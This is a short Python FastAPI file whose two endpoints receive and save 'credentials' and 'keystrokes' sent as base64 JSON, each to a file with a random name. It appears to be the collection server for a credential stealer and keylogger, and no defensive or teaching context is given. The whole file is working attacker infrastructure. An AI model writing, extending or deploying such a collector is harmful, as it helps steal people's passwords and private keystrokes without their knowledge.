from typing import Union
from fastapi import FastAPI, Request
import uuid

app = FastAPI()

@app.post("/payload")
async def storePayload(request: Request):
    json = await request.json()
    b64 = json["credentials"]
    with open(uuid.uuid4().hex, "w") as f:
        f.write(b64)
    return {"status": "OK"}

@app.post("/keystrokes")
async def storeKeystrokes(request: Request):
    json = await request.json()
    b64 = json["keystrokes"]
    with open("keystrokes_" + uuid.uuid4().hex, "w") as f:
        f.write(b64)
    return {"status": "OK"}